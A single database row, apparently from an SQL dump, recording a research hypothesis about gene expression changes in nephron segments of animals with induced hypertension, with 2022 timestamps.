	(9939,275,'hypothesis','\"The study of human pathologies in animal models  is useful to understand which molecular processes are involved and which are the possible targets to be used for pharmacological research. In particular in this study are analyzed the alterations of gene expression in specific districts of the nephron in animals with induced hypertension.   \"','2022-03-31 13:24:05','2022-03-31 13:24:05'),
